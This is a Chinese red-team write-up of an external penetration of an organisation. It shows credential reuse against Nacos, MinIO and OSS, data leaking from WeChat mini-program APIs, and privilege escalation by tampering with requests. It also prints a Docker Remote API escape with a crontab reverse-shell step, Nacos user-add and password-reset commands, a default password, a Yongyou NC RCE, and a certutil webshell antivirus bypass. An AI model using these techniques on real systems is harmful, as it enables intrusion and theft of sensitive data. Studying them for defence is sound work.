<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-66928849da0ca5930c02525ce43efa892d6b634a.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-66928849da0ca5930c02525ce43efa892d6b634a.png">
        
    </a></p>
<p>登录MinIO，发现大量所属目标单位的敏感信息，也存在其它单位的敏感信息</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-c1f383551c52acd3ee64b926f7d93fd9c137aef3.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-c1f383551c52acd3ee64b926f7d93fd9c137aef3.png">
        
    </a></p>
<p>登录Nacos，大量配置文件，密码信息加入密码本![]</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ac9cf0350376d0bdad40573ddba38eb4c5506cbd.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ac9cf0350376d0bdad40573ddba38eb4c5506cbd.png">
        
    </a><br>
登录OSS，发现大量所属目标单位的敏感信息</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-19969a44c514fa8ba5769db3cad69ee31c3e5997.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-19969a44c514fa8ba5769db3cad69ee31c3e5997.png">
        
    </a></p>
<h2 id="12微信小程序接口未授权" class="headerLink">
    <a href="#12%e5%be%ae%e4%bf%a1%e5%b0%8f%e7%a8%8b%e5%ba%8f%e6%8e%a5%e5%8f%a3%e6%9c%aa%e6%8e%88%e6%9d%83" class="header-mark"></a>1.2、微信小程序接口未授权</h2><h3 id="121微信小程序解包" class="headerLink">
    <a href="#121%e5%be%ae%e4%bf%a1%e5%b0%8f%e7%a8%8b%e5%ba%8f%e8%a7%a3%e5%8c%85" class="header-mark"></a>1.2.1、微信小程序解包</h3><p>想要对微信小程序进行解包操作，首先是要获取目标小程序的wxapkg文件。wxapkg文件是微信小程序的安装包文件格式，用于将小程序的代码、资源以及其他必要的文件打包成一个单独的文件。但是Windows环境下的wxapkg文件中的js代码和资源文件一般是被加密的，需要使用专门设计的解密工具先进行解密，再进行解包操作，获取文件内容。iOS和Android平台下可直接进行解包操作。</p>
<h4 id="1211获取wxapkg文件" class="headerLink">
    <a href="#1211%e8%8e%b7%e5%8f%96wxapkg%e6%96%87%e4%bb%b6" class="header-mark"></a>1.2.1.1、获取wxapkg文件</h4><p>在获取wxapkg文件时，最好将文件夹中的文件先删除，然后再重新打开小程序，防止其它文件干扰</p>
<p>iOS wxapkg 文件存放路径为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">mobile</span><span class="o">/</span><span class="nx">Containers</span><span class="o">/</span><span class="nx">Data</span><span class="o">/</span><span class="nx">Application</span><span class="o">/</span><span class="p">{</span><span class="nx">系统UUID</span><span class="p">}</span><span class="o">/</span><span class="nx">Library</span><span class="o">/</span><span class="nx">WechatPrivate</span><span class="o">/</span><span class="p">{</span><span class="nx">user哈希值</span><span class="p">}</span><span class="o">/</span><span class="nx">WeApp</span><span class="o">/</span><span class="nx">LocalCache</span><span class="o">/</span><span class="nx">release</span><span class="o">/</span><span class="p">{</span><span class="nx">小程序的AppID</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Android wxapkg 文件存放路径为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">com</span><span class="o">.</span><span class="nx">tencent</span><span class="o">.</span><span class="nx">mm</span><span class="o">/</span><span class="nx">MicroMsg</span><span class="o">/</span><span class="p">{</span><span class="nx">user哈希值</span><span class="p">}</span><span class="o">/</span><span class="nx">appbrand</span><span class="o">/</span><span class="nx">pkg</span><span class="o">/</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Windows wxapkg 文件存放路径为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">C</span><span class="o">:</span><span class="nx">\Users\</span><span class="p">{</span><span class="nx">系统用户名</span><span class="p">}</span><span class="nx">\Documents\WeChat</span> <span class="nx">Files\Applet\</span><span class="p">{</span><span class="nx">小程序的AppID</span><span class="p">}</span><span class="nx">\</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-c07cd9ddd04c8648c9c91b6f299567c0b72b41ad.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-c07cd9ddd04c8648c9c91b6f299567c0b72b41ad.png">
        
    </a></p>
<h4 id="1212解密操作" class="headerLink">
    <a href="#1212%e8%a7%a3%e5%af%86%e6%93%8d%e4%bd%9c" class="header-mark"></a>1.2.1.2、解密操作</h4><p>下面两个github项目都可以进行解密操作</p>
<p><a href="https://github.com/superdashu/pc_wxapkg_decrypt_python" target="_blank" rel="noopener noreferrer">https://github.com/superdashu/pc_wxapkg_decrypt_python</a><br>
<a href="https://github.com/BlackTrace/pc_wxapkg_decrypt" target="_blank" rel="noopener noreferrer">https://github.com/BlackTrace/pc_wxapkg_decrypt</a></p>
<p>解密原理</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-d27d47fad9d778623595d826710881eb124d9568.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-d27d47fad9d778623595d826710881eb124d9568.png">
        
    </a><br>
成功解密</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-cf8e0087265e9df8bccd324c23b00b2c999208a3.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-cf8e0087265e9df8bccd324c23b00b2c999208a3.png">
        
    </a></p>
<h4 id="1212解包操作" class="headerLink">
    <a href="#1212%e8%a7%a3%e5%8c%85%e6%93%8d%e4%bd%9c" class="header-mark"></a>1.2.1.2、解包操作</h4><p>国光大佬提供的工具下载链接</p>
<p><a href="https://sqlsec.lanzoub.com/i1NEP0mx694f" target="_blank" rel="noopener noreferrer">https://sqlsec.lanzoub.com/i1NEP0mx694f</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">node</span> <span class="nx">wuWxapkg</span><span class="o">.</span><span class="nx">js</span> <span class="mf">1.</span><span class="nx">wxapkg</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-34059d3982e40191688ff91a62ff887f20664ed1.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-34059d3982e40191688ff91a62ff887f20664ed1.png">
        
    </a></p>
<p>对小程序进行解包操作，获取到前端JS代码后中，从中进行提取获得接口</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-9d445cec5aa86f847adfa0539ce14de6d811fcbc.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-9d445cec5aa86f847adfa0539ce14de6d811fcbc.png">
        
    </a></p>
<p>直接访问目标接口，前端页面虽然显示初始化失败</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-15d32eb56abb7ade12e2457bf0e2831eff541cee.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-15d32eb56abb7ade12e2457bf0e2831eff541cee.png">
        
    </a><br>
但流量包中已获取数据，近千万条目标单位敏感信息</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-54eca16fac67d0a5ee4681bb3fd48aa33c55adb5.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-54eca16fac67d0a5ee4681bb3fd48aa33c55adb5.png">
        
    </a></p>
<h2 id="13web程序越权" class="headerLink">
    <a href="#13web%e7%a8%8b%e5%ba%8f%e8%b6%8a%e6%9d%83" class="header-mark"></a>1.3、web程序越权</h2><p>通过上述收集到的密码，撞密码撞出一个账号，但是此账号为最低权限，无任何操作权限，点击搜索组织架构，此时无任何返回信息<br>
<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-13aebe0c150b3a80913a78bea00857172d90edd8.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-13aebe0c150b3a80913a78bea00857172d90edd8.png">
        
    </a></p>
<p>抓包将parentId和orgLevel去除，再发包，即可越权看到全员组织架构</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-eaaa24aec2cd0aaffcba0cb30c7867bba9e0f61d.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-eaaa24aec2cd0aaffcba0cb30c7867bba9e0f61d.png">
        
    </a></p>
<p>点击修改密码，然后将上述获取到的roleId添加进去，即可获取全部权限</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-766adde7cecebb3b8aa309fd163c508dd0cc9197.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-766adde7cecebb3b8aa309fd163c508dd0cc9197.png">
        
    </a></p>
<p>获取到大量数据</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-aaceb387674ff04511482b780b03369902094232.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-aaceb387674ff04511482b780b03369902094232.png">
        
    </a></p>
<h2 id="14公众号" class="headerLink">
    <a href="#14%e5%85%ac%e4%bc%97%e5%8f%b7" class="header-mark"></a>1.4、公众号</h2><p>js泄露密码，密码可撞库目标单位公众号</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ff3a1b05088baedcae2323da2f0c6634277c44c6.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ff3a1b05088baedcae2323da2f0c6634277c44c6.png">
        
    </a></p>
<h2 id="2云原生安全" class="headerLink">
    <a href="#2%e4%ba%91%e5%8e%9f%e7%94%9f%e5%ae%89%e5%85%a8" class="header-mark"></a>2、云原生安全</h2><p>容器化部署和微服务架构为应用程序开发和部署提供了更好的灵活性、可伸缩性、可维护性和性能，受到了越来越多厂商的使用，新的应用就会引入新的攻击面，如容器逃逸、服务间攻击、API滥用等。攻击者可以利用这些新的入口点来攻击应用程序和数据。并且在云原生环境下管理用户和服务的身份验证和授权变得更加复杂。许多应用开发商在追求容器化和云原生架构的便利性和效率时，安全性常常被忽视或放在次要位置。这就直接导致了云原生环境的脆弱，容易受到各种安全威胁和攻击。</p>
<h2 id="21harbor-镜像仓库" class="headerLink">
    <a href="#21harbor-%e9%95%9c%e5%83%8f%e4%bb%93%e5%ba%93" class="header-mark"></a>2.1、Harbor 镜像仓库</h2><p>Harbor是一个开源的容器镜像仓库管理器，旨在帮助组织存储、管理和分发Docker容器镜像，但是Harbor存在一个充满争议的“漏洞”：任意用户能够直接获取public的镜像。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-3ec46704bd4d00efdb7cd3a3a2d9672cacc1e7ee.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-3ec46704bd4d00efdb7cd3a3a2d9672cacc1e7ee.png">
        
    </a></p>
<p>可以直接拉取下载镜像文件，可以利用脚本批量下载</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-f74f3ef03424a1113ec294ac4cbd2b357319fd30.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-f74f3ef03424a1113ec294ac4cbd2b357319fd30.png">
        
    </a></p>
<h2 id="22疑似后门" class="headerLink">
    <a href="#22%e7%96%91%e4%bc%bc%e5%90%8e%e9%97%a8" class="header-mark"></a>2.2、疑似后门</h2><p>通过镜像文件获取jar包，获取配置文件等敏感信息，对jar包的class文件进行反编译，进行代码审计获取到一个类似后门的漏洞，该接口只需要使用用户名，即可登录系统后台。管理员权限配合文件上传获取服务器权限。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-7db617495fcff84526349e5c19fb2c8824e5a18d.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-7db617495fcff84526349e5c19fb2c8824e5a18d.png">
        
    </a></p>
<p>通过配置文件连接数据库等</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-9663ada321e037f5d9e7399a0c7c5861b57b5c3f.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-9663ada321e037f5d9e7399a0c7c5861b57b5c3f.png">
        
    </a></p>
<h2 id="23docker未授权" class="headerLink">
    <a href="#23docker%e6%9c%aa%e6%8e%88%e6%9d%83" class="header-mark"></a>2.3、docker未授权</h2><h3 id="231-registry-api未授权访问" class="headerLink">
    <a href="#231-registry-api%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="header-mark"></a>2.3.1、 registry api未授权访问</h3><p>在 Docker Registry API 中，认证和授权通常是基于访问令牌（Access Token）或者用户名和密码的。如果未正确设置访问控制权限，即会造成未授权访问漏洞，攻击者可直接下载registry仓库的所有镜像容器。</p>
<p>访问/v2/_catalog接口即可查看全部仓库内容</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-c506302d2a4bd8ad82556dbabd2be3a46eb0eae8.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-c506302d2a4bd8ad82556dbabd2be3a46eb0eae8.png">
        
    </a><br>
<a href="https://github.com/Soufaker/docker_v2_catalog" target="_blank" rel="noopener noreferrer">https://github.com/Soufaker/docker_v2_catalog</a></p>
<p>利用上述工具可直接下载镜像</p>
<h3 id="232-docker-remote-api未授权访问" class="headerLink">
    <a href="#232-docker-remote-api%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="header-mark"></a>2.3.2、 Docker Remote API未授权访问</h3><p>为了管理容器集群，Docker允许Daemon作为后台守护进程执行通过管理接口发送的Docker命令，使用参数-H 0.0.0.0:2375启动Docker Daemon时，将开放2375端口接收来自远程Docker客户端的命令。在这种情况下，2375端口被作为非加密端口暴露出来，并且不存在任何形式的身份验证，攻击者可以直接使用Docker命令连接到Docker Daemon，并对容器进行直接操作，配合根目录挂载即可实现容器逃逸。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#查看容器 docker -H tcp://&lt;target&gt;:2375 ps -a
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-51cfb8bea7521008030a205378af8c6c852f3660.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-51cfb8bea7521008030a205378af8c6c852f3660.png">
        
    </a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#挂载宿主机的根目录到容器内的mnt目录 docker -H tcp://&lt;target&gt;:2375 run -it -v /:/mnt nginx:latest /bin/bash #反弹shell echo &#39;反弹shell命令&#39; &gt;&gt; /mnt/var/spool/cron/crontabs/root
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="24nacos" class="headerLink">
    <a href="#24nacos" class="header-mark"></a>2.4、Nacos</h2><p>Nacos是一个开源的动态服务发现、配置管理和服务管理平台，它提供了注册中心、配置中心和服务管理等功能，帮助开发人员实现微服务架构中的服务注册、配置管理以及服务发现等需求。</p>
<p>作为一个开源工具，漏洞还是被披露不少的，</p>
<p><strong>未授权访问：</strong><a href="http://192.168.80.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1" target="_blank" rel="noopener noreferrer">/nacos/v1/auth/users?pageNo=1&amp;pageSize=1</a> 直接查看用户</p>
<p><strong>任意用户添加</strong>：POST <a href="http://192.168.80.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1" target="_blank" rel="noopener noreferrer">/nacos/v1/auth/users</a> username= &amp; password=</p>
<p><strong>任意用户密码修改</strong>：curl -X PUT &lsquo;<a href="http://127.0.0.1:8848/nacos/v1/auth/users?accessToken" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8848/nacos/v1/auth/users?accessToken</a>\=&rsquo; -H &lsquo;User-Agent:Nacos-Server&rsquo; -d &lsquo;username\=test1&amp;newPassword\=test2&rsquo;</p>
<p><strong>弱口令</strong>：nacos/nacos</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-bc51f0813b8aa1b7f7072167c68ba15a26d10279.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-bc51f0813b8aa1b7f7072167c68ba15a26d10279.png">
        
    </a></p>
<p>通过编排密码爆破进后台，发现大量配置文件，但敏感信息均被加密</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-62d51f1c7326e7114b1022865a3669ed6d4f46b7.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-62d51f1c7326e7114b1022865a3669ed6d4f46b7.png">
        
    </a></p>
<h3 id="241jasypt加密" class="headerLink">
    <a href="#241jasypt%e5%8a%a0%e5%af%86" class="header-mark"></a>2.4.1、Jasypt加密</h3><p>Spring 的配置文件中会有一些敏感信息，如数据库密码，因此有时我们希望将敏感信息加密，Jasypt 就是其中比较方便的工具，Jasypt 是一个 Java 库，用于简化敏感数据（如密码、API 密钥等）的加密和解密操作。</p>
<p>加密的内容需要用 ENC(..) 括起来，加密用的密码通过 jasypt.encryptor.password 指定。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">spring</span><span class="o">:</span> <span class="nx">datasource</span><span class="o">:</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">your</span><span class="o">-</span><span class="nx">username</span> <span class="nx">password</span><span class="o">:</span> <span class="nx">ENC</span><span class="p">(</span><span class="nx">encrypted</span><span class="o">-</span><span class="nx">password</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>因为必须要解密，密码就需要放在配置文件里，或者放在代码中：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># application.yml jasypt: encryption: password: 密码 algorithm: 加密方式
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>解密数据：使用解密器的 decrypt 方法对加密的数据进行解密操作。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">org</span><span class="o">.</span><span class="nx">jasypt</span><span class="o">.</span><span class="nx">util</span><span class="o">.</span><span class="nx">text</span><span class="o">.</span><span class="nx">BasicTextEncryptor</span><span class="p">;</span> <span class="k">public</span> <span class="k">class</span> <span class="nc">DecryptionExample</span> <span class="p">{</span> <span class="k">public</span> <span class="k">static</span> <span class="nx">void</span> <span class="nx">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="p">{</span> <span class="nx">String</span> <span class="nx">encryptionKey</span> <span class="o">=</span> <span class="s2">&#34;yourEncryptionKey&#34;</span><span class="p">;</span> <span class="c1">// 加密密钥 BasicTextEncryptor textEncryptor = new BasicTextEncryptor(); textEncryptor.setPassword(encryptionKey); String encryptedText = &#34;encryptedText&#34;; // 加密后的数据 String decryptedText = textEncryptor.decrypt(encryptedText); System.out.println(&#34;Decrypted Text: &#34; + decryptedText); } }
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>但是客户端加密的安全性主要依赖于客户端代码的保护和可信任性，当密码泄露后，加密也就自然失效了，在ncaos一个文件中发现jasypt加密密码，可以直接进行解密操作</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-9faa6a1da39d5898cb65917064c9885c218ded42.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-9faa6a1da39d5898cb65917064c9885c218ded42.png">
        
    </a><br>
成功连接OSS</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-572d2495c72d7b1a2b65dce002b6f11edb94260b.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-572d2495c72d7b1a2b65dce002b6f11edb94260b.png">
        
    </a></p>
<p>成功连接数据库</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-a758622d45da44e07aa10ed7765337f625f449c5.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-a758622d45da44e07aa10ed7765337f625f449c5.png">
        
    </a></p>
<p>小程序token，接管小程序</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-d07c1eb2ba1682ffe1f4a4733a0f5edf186b18de.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-d07c1eb2ba1682ffe1f4a4733a0f5edf186b18de.png">
        
    </a></p>
<p>达梦数据库是国产化的关系型数据库，使用下面工具可以进行连接</p>
<p><a href="https://github.com/864381832/x-RdbmsSyncTool/releases/tag/v0.0.3" target="_blank" rel="noopener noreferrer">https://github.com/864381832/x-RdbmsSyncTool/releases/tag/v0.0.3</a></p>
<h2 id="3nday" class="headerLink">
    <a href="#3nday" class="header-mark"></a>3、Nday</h2><h2 id="31yongyounc-jsinvoke-rce漏洞" class="headerLink">
    <a href="#31yongyounc-jsinvoke-rce%e6%bc%8f%e6%b4%9e" class="header-mark"></a>3.1、yongyouNC jsInvoke rce漏洞</h2><p>漏洞利用方法，通过Java反射机制创建一个javax.naming.InitialContext对象，并使用LDAP协议连接到指定的IP地址和端口，然后调用&quot;nc.itf.iufo.IBaseSPService&quot;服务中的&quot;saveXStreamConfig&quot;方法，接受对象和字符串作为参数，达到命令执行的效果。</p>
<p>命令执行成功，但是目标系统存在杀软，无法直接上传文件</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-7965cfa7808da6e0981fbf7b46a710bce3dcf9db.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-7965cfa7808da6e0981fbf7b46a710bce3dcf9db.png">
        
    </a></p>
<h3 id="311certutil" class="headerLink">
    <a href="#311certutil" class="header-mark"></a>3.1.1、certutil</h3><p>certutil 是 Windows 操作系统中的一个命令行工具，主要用于处理证书和加密相关的操作，利用 certutil的解密操作可以绕过杀软。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">bash64编码后的免杀马</span> <span class="o">&gt;</span> <span class="nx">myfile</span><span class="o">.</span><span class="nx">jsp</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ca978a10493d65b989cf352bbbd125c2f77d8d4b.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ca978a10493d65b989cf352bbbd125c2f77d8d4b.png">
        
    </a></p>
<p>使用certutil进行解码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">certutil</span> <span class="o">-</span><span class="nx">decode</span> <span class="nx">木马相对路径</span> <span class="nx">解码后的木马相对路径</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-0069dbaf0c23e4ea2e284cccc370d0508c1f35a0.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-0069dbaf0c23e4ea2e284cccc370d0508c1f35a0.png">
        
    </a></p>
